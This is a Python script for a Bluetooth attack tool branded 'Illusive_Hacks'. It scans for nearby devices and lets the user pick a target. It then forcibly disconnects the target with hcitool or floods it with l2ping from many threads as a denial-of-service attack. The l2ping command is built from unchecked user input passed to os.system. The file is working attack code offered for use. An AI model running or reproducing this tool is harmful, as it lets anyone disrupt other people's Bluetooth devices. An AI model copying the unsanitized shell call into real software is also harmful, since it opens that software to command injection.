import os
import threading
import subprocess
import json
import logging
from colorama import init, Fore, Style
from bleak import BleakScanner, BleakClient

# Initialize colorama
init(autoreset=True)

# Configure logging
LOG_FILE = 'bluetooth_manager.log'
logging.basicConfig(
    filename=LOG_FILE, level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

CONFIG_FILE = 'config.json'

def display_banner():
    """Display ASCII banner."""
    banner = """
 ▄▄▄▄    ██▓     █    ██ ▓█████   ██████  ██▓███ ▓██   ██▓▓█████▄ ▓█████  ██▀███  
 ▓█████▄ ▓██▒     ██  ▓██▒▓█   ▀ ▒██    ▒ ▓██░  ██▒▒██  ██▒▒██▀ ██▌▓█   ▀ ▓██ ▒ ██▒
 ▒██▒ ▄██▒██░    ▓██  ▒██░▒███   ░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░░██   █▌▒███   ▓██ ░▄█ ▒
 ▒██░█▀  ▒██░    ▓▓█  ░██░▒▓█  ▄   ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░░▓█▄   ▌▒▓█  ▄ ▒██▀▀█▄  
 ░▓█  ▀█▓░██████▒▒▒█████▓ ░▒████▒▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░░▒████▓ ░▒████▒░██▓ ▒██▒
 ░▒▓███▀▒░ ▒░▓  ░░▒▓▒ ▒ ▒ ░░ ▒░ ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒  ▒▒▓  ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░
 ▒░▒   ░ ░ ░ ▒  ░░░▒░ ░ ░  ░ ░  ░░ ░▒  ░ ░░▒ ░     ▓██ ░▒░  ░ ▒  ▒  ░ ░  ░  ░▒ ░ ▒░
 ░    ░   ░ ░    ░░░ ░ ░    ░   ░  ░  ░  ░░       ▒ ▒ ░░   ░ ░  ░    ░     ░░   ░ 
 ░          ░  ░   ░        ░  ░      ░           ░ ░        ░       ░  ░   ░     
      ░                                           ░ ░      ░                

                   Illusive_Hacks - For Educational Use Only
                            DEATH IS INEVITABLE
    """
    print("\033[92m" + banner + "\033[0m")  # Green color

def clear_terminal():
    """Clear the terminal screen."""
    os.system('cls' if os.name == 'nt' else 'clear')

def load_config():
    """Load configuration from a JSON file."""
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as f:
            return json.load(f)
    return {}

def save_config(config):
    """Save configuration to a JSON file."""
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f, indent=4)

async def scan_devices():
    """Scan for nearby Bluetooth devices."""
    logging.info("Scanning for Bluetooth devices...")
    devices = []

    try:
        found_devices = await BleakScanner.discover()
        devices = [(d.address, d.name or "Unknown") for d in found_devices]
        logging.info(f"Found {len(devices)} devices.")
    except Exception as e:
        logging.error(f"Error during scanning: {e}")
        print(Fore.RED + "Error occurred during scanning." + Style.RESET_ALL)

    if not devices:
        print(Fore.RED + "No devices found. Try again." + Style.RESET_ALL)
        return []

    print(Fore.YELLOW + "\n=== Devices Found ===" + Style.RESET_ALL)
    for i, (addr, name) in enumerate(devices):
        print(Fore.CYAN + f"{i}: {name} ({addr})" + Style.RESET_ALL)

    return devices

def select_device(devices):
    """Select a device from the list of discovered devices."""
    while True:
        try:
            index = int(input(Fore.CYAN + "Select a device by index: " + Style.RESET_ALL))
            if 0 <= index < len(devices):
                return devices[index]
            else:
                logging.warning("Invalid index. Please try again.")
        except ValueError:
            logging.warning("Invalid input. Please enter a number.")

async def connect_to_device(device_addr):
    """Connect to the selected Bluetooth device."""
    try:
        async with BleakClient(device_addr) as client:
            print(Fore.GREEN + f"Successfully connected to {device_addr}" + Style.RESET_ALL)
            logging.info(f"Connected to {device_addr}")
    except Exception as e:
        print(Fore.RED + f"Failed to connect to {device_addr}: {e}" + Style.RESET_ALL)
        logging.error(f"Failed to connect to {device_addr}: {e}")

def deauthenticate_device(device_addr):
    """Deauthenticate a Bluetooth device."""
    try:
        subprocess.run(['hcitool', 'dc', device_addr], check=True)
        print(Fore.GREEN + f"Successfully deauthenticated {device_addr}" + Style.RESET_ALL)
        logging.info(f"Deauthenticated {device_addr}")
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"Failed to deauthenticate {device_addr}: {e}" + Style.RESET_ALL)
        logging.error(f"Failed to deauthenticate {device_addr}: {e}")

def dos_attack(target_addr, package_size, threads_count):
    """Launch a DoS attack on a target Bluetooth device."""
    def dos(target, size):
        os.system(f'l2ping -i hci0 -s {size} -f {target}')

    print(Fore.RED + "[*] Starting DoS attack..." + Style.RESET_ALL)
    for i in range(threads_count):
        threading.Thread(target=dos, args=(target_addr, package_size)).start()
    logging.info(f"Started DoS attack on {target_addr} with {threads_count} threads and package size {package_size}.")

def display_menu():
    """Display the main menu."""
    print(Fore.GREEN + "=== Bluetooth Device Manager ===" + Style.RESET_ALL)
    print("1. Scan for Devices")
    print("2. Select Device")
    print("3. Connect to Device")
    print("4. Deauthenticate Device")
    print("5. DoS Attack")
    print("6. Exit")

def main():
    """Main program loop."""
    import asyncio

    devices = []
    selected_device = None

    while True:
        clear_terminal()
        display_banner()

        display_menu()
        choice = input(Fore.CYAN + "Enter your choice: " + Style.RESET_ALL)

        if choice == '1':
            devices = asyncio.run(scan_devices())
            input(Fore.GREEN + "\nPress Enter to continue..." + Style.RESET_ALL)  # Pause after scanning
        elif choice == '2':
            if devices:
                selected_device = select_device(devices)
                if selected_device:
                    print(Fore.YELLOW + f"Selected Device: {selected_device[1]} ({selected_device[0]})" + Style.RESET_ALL)
                    logging.info(f"Selected device: {selected_device}")
            else:
                print(Fore.RED + "No devices found. Please scan for devices first." + Style.RESET_ALL)
            input(Fore.GREEN + "\nPress Enter to continue..." + Style.RESET_ALL)  # Pause after selection
        elif choice == '3':
            if selected_device:
                print(Fore.YELLOW + f"Connecting to: {selected_device[1]} ({selected_device[0]})" + Style.RESET_ALL)
                asyncio.run(connect_to_device(selected_device[0]))
            else:
                print(Fore.RED + "No device selected. Please select a device first." + Style.RESET_ALL)
            input(Fore.GREEN + "\nPress Enter to continue..." + Style.RESET_ALL)  # Pause after connection
        elif choice == '4':
            if selected_device:
                print(Fore.YELLOW + f"Deauthenticating: {selected_device[1]} ({selected_device[0]})" + Style.RESET_ALL)
                deauthenticate_device(selected_device[0])
            else:
                print(Fore.RED + "No device selected. Please select a device first." + Style.RESET_ALL)
            input(Fore.GREEN + "\nPress Enter to continue..." + Style.RESET_ALL)  # Pause after deauth
        elif choice == '5':
            if selected_device:
                print(Fore.YELLOW + f"Targeting: {selected_device[1]} ({selected_device[0]})" + Style.RESET_ALL)
                package_size = int(input("Enter package size: "))
                threads_count = int(input("Enter number of threads: "))
                dos_attack(selected_device[0], package_size, threads_count)
            else:
                print(Fore.RED + "No device selected. Please select a device first." + Style.RESET_ALL)
            input(Fore.GREEN + "\nPress Enter to continue..." + Style.RESET_ALL)  # Pause after attack
        elif choice == '6':
            logging.info("Exiting program.")
            print(Fore.GREEN + "Goodbye!" + Style.RESET_ALL)
            break
        else:
            print(Fore.RED + "Invalid choice. Please try again." + Style.RESET_ALL)

if __name__ == "__main__":
    main()
